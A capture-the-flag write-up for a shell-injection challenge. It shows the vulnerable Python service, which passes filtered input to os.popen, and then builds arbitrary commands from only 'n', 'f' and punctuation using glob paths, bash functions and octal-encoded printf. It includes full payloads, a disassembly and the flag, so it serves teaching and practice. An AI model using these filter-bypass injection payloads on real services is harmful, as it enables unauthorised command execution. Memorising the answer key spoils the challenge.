# Bashing your spirit foods
Testing on bash injection knowledge

<i>Creator - @Platy</i>

## Category
Pwn

## Question
>You are not yourself when you are hungry. Have a CTF challenge and stop <i>bashing</i> people up.
>
>Connect via `nc <ip address> 17450`

### Hint
`I hate needles`

## Setup Guide
Do `bash build.sh`

## Distribution
None.

## Solution
This challenge tests on bash injection.
```
Foods available
[n]achos
[f]ishies
> 
```
If we try to enter any other letters besides `n` or `f`, we will get:
```
Sorry, but we do not serve these here. Maybe next time!
```
When we try to get `n` for nachos, we get this:
```
  _   _            _               
 | \ | |          | |              
 |  \| | __ _  ___| |__   ___  ___ 
 | . ` |/ _` |/ __| '_ \ / _ \/ __|
 | |\  | (_| | (__| | | | (_) \__ \
 |_| \_|\__,_|\___|_| |_|\___/|___/

Hope you enjoy!
sh: 1: n: not found
```
Same goes when we type `f` except we get 'Fishies' instead of 'Nachos'.

We get `sh: 1 n: not found`. It runs a shell with the input as the command. For example, if we entered `cat /etc/passwd`, the output will be printed back. However, we cannot use such a enter that because it contains other letters besides `n` or `f`. When we try `nnnnnn`, it shows `sh: 1: nnnnnn: not found`.

First, we should try using cat to view the contents of all the files. But how can we send cat using only `n` or `f`? It turns out after trying many different characters, it accepts special characters `!@#$%^*()[]{};',.` etc.

So we can use special characters and the letters `n` and `f`. Now we're getting somewhere. Unix has autocompletion functions. Typing out `cat *` well expand to `cat <filename>`. The asterisk represents any number of characters. The question marks represents only one character.

So by inputting `/??n/??? ./*`, we manage to view all the files in the current directory. This reveals the python script and shows what it is actually doing

```python
def getFlag():
	input = raw_input('''Foods available
[n]achos
[f]ishies
> ''')
	if (re.findall('[0-9a-eg-mo-zA-Z]',input) == []):
		if input == 'n':
			nachos()
		elif input == 'f':
			fish()
		print 'Hope you enjoy!'
		print os.popen(input).read()
	else:
		print 'Sorry, but we do not serve these here. Maybe next time!'
```

We can now see that it filters out `[0-9a-eg-mo-zA-Z]`.

By using autocompletition again, we can use `printf` to output the necessary characters to the file.

Locate `printf` by using `/*/??n/???n?f`

Functions can be created in bash `functionName(){ function; }`. By using this method we can create a print function `n(){ /*/??n/???n?f ${@}; };` where `${@}` represents the parameters passed to the print function

We can use octal to print out characters. All we need now is to be able to print numbers without actually printing numbers.

`${#}` counts the number of arguments specified to the print function. Using the previously declared function `n`, we can use it to create a new function `f(){ n ${#}; };`

Now we can specify any number we want and by extension, whatever string we want. This prints out 'a' because the octal for 'a' is '141'. Therefore, there are 3 function `f` with 1, 4 and 1 as arguments respectively:
```bash
n(){ /*/??n/???n?f ${@}; }; f(){ n ${#}; };n $(n \\\\`f "" ; f "" "" "" "" ; f "" ; `;)
```

We can add another `$()` that acts like an 'eval' function which allows us to run whatever command we like. You can run any command with nothing more than 'n', 'f' and a bunch of special characters!

For example, `ls` becomes this:
```bash
n(){ /*/??n/???n?f ${@}; }; f(){ n ${#}; };$(n $(n \\\\`f "" ; f "" "" "" "" "" ; f "" "" "" "" ; `;n \\\\`f "" ; f "" "" "" "" "" "" ; f "" "" "" ; `;))
```

There is a generator `solution.py` in the solution folder to generate the commands.

Basically, we have shell access with a very troublesome way to run commands.

We can now use `ls -la` to find if there are any interesting files. Remember to separate the 2 commands and pipe it in manually. Also, do not redefine the functions again.

We find a file called `f14g` which when cat, does not show us a flag, but a clue to where the next flag is. Do `ls -l -d -1 /*/* | grep flag` to find if there are any interesting files. Remember to separate the 2 commands and pipe it in manually. Also, do not redefine the functions again.

```bash
n(){ /*/??n/???n?f ${@}; }; f(){ n ${#}; };$(n $(n \\\\`f "" ; f "" "" "" "" "" ; f "" "" "" "" ; `;n \\\\`f "" ; f "" "" "" "" "" "" ; f "" "" "" ; `;n \\\\`f "" "" "" "" ; f ; `;n \\\\`f "" "" "" "" "" ; f "" "" "" "" "" ; `;n \\\\`f "" ; f "" "" "" "" ; f "" ; `;n \\\\`f "" "" "" "" ; f ; `;n \\\\`f "" "" "" "" "" ; f "" "" "" "" "" ; `;n \\\\`f "" ; f "" "" "" "" ; f "" "" "" "" ; `;n \\\\`f "" "" "" "" ; f ; `;n \\\\`f "" "" "" "" "" ; f "" "" "" "" "" ; `;n \\\\`f "" "" "" "" "" "" ; f "" ; `;n \\\\`f "" "" "" "" ; f ; `;n \\\\`f "" "" "" "" "" ; f "" "" "" "" "" "" "" ; `;n \\\\`f "" "" "" "" "" ; f "" "" ; `;n \\\\`f "" "" "" "" "" ; f "" "" "" "" "" "" "" ; `;n \\\\`f "" "" "" "" "" ; f "" "" ; `;)) | $(n $(n \\\\`f "" ; f "" "" "" "" ; f "" "" "" "" "" "" "" ; `;n \\\\`f "" ; f "" "" "" "" "" "" ; f "" "" ; `;n \\\\`f "" ; f "" "" "" "" ; f "" "" "" "" "" ; `;n \\\\`f "" ; f "" "" "" "" "" "" ; f ; `;n \\\\`f "" "" "" "" ; f ; `;n \\\\`f "" ; f "" "" "" "" ; f "" "" "" "" "" "" ; `;n \\\\`f "" ; f "" "" "" "" "" ; f "" "" "" "" ; `;n \\\\`f "" ; f "" "" "" "" ; f "" ; `;n \\\\`f "" ; f "" "" "" "" ; f "" "" "" "" "" "" "" ; `;))
```

We can see this file called `/bin/thisisareallylongflagbutifyoucansomehowcatthisitwouldbeamazing`

Cat the file and you can see assembler code

```asm
(gdb) disas main
Dump of assembler code for function main:
   0x00000000000006b0 <+0>:	push   rbp
   0x00000000000006b1 <+1>:	mov    rbp,rsp
   0x00000000000006b4 <+4>:	push   0x7d
   0x00000000000006b6 <+6>:	push   0x68
   0x00000000000006b8 <+8>:	push   0x37
   0x00000000000006ba <+10>:	push   0x6c
   0x00000000000006bc <+12>:	push   0x34
   0x00000000000006be <+14>:	push   0x33
   0x00000000000006c0 <+16>:	push   0x68
   0x00000000000006c2 <+18>:	push   0x5f
   0x00000000000006c4 <+20>:	push   0x72
   0x00000000000006c6 <+22>:	push   0x30
   0x00000000000006c8 <+24>:	push   0x66
   0x00000000000006ca <+26>:	push   0x5f
   0x00000000000006cc <+28>:	push   0x64
   0x00000000000006ce <+30>:	push   0x34
   0x00000000000006d0 <+32>:	push   0x62
   0x00000000000006d2 <+34>:	push   0x5f
   0x00000000000006d4 <+36>:	push   0x35
   0x00000000000006d6 <+38>:	push   0x31
   0x00000000000006d8 <+40>:	push   0x5f
   0x00000000000006da <+42>:	push   0x36
   0x00000000000006dc <+44>:	push   0x6e
   0x00000000000006de <+46>:	push   0x31
   0x00000000000006e0 <+48>:	push   0x68
   0x00000000000006e2 <+50>:	push   0x35
   0x00000000000006e4 <+52>:	push   0x34
   0x00000000000006e6 <+54>:	push   0x62
   0x00000000000006e8 <+56>:	mov    r9d,0x7b
   0x00000000000006ee <+62>:	mov    r8d,0x46
   0x00000000000006f4 <+68>:	mov    ecx,0x54
   0x00000000000006f9 <+73>:	mov    edx,0x43
   0x00000000000006fe <+78>:	mov    esi,0x47
   0x0000000000000703 <+83>:	lea    rdi,[rip+0xae]        # 0x7b8
   0x000000000000070a <+90>:	mov    eax,0x0
   0x000000000000070f <+95>:	call   0x560 <printf@plt>
   0x0000000000000714 <+100>:	add    rsp,0xd0
   0x000000000000071b <+107>:	mov    eax,0x0
   0x0000000000000720 <+112>:	leave
   0x0000000000000721 <+113>:	ret
End of assembler dump.
```

As we can see, a lot of values are being pushed into the stack. And at the end, it calls the `printf` function.

We can store all the items in the stack and decode it into ascii using a small python script

```python
values = [0x47,0x43,0x54,0x46,0x7b,0x62,0x34,0x35,0x68,0x31,0x6e,0x36,0x5f,0x62,0x34,0x64,0x5f,0x66,0x30,0x72,0x5f,0x68,0x33,0x34,0x6c,0x37,0x68,0x7d]
for i in values:
	print(chr(i),end='')
print()
```

### Flag
`GCTF{b45h1n6_15_b4d_f0r_h34l7h}`

## Distribution
No files to be distributed

## Credits
33c3 ctf - 2016

Misc.

hohoho - 350pts

## Recommended Reads
- https://www.youtube.com/watch?v=6D1LnMj0Yt0
- https://linux.die.net/man/1/bash
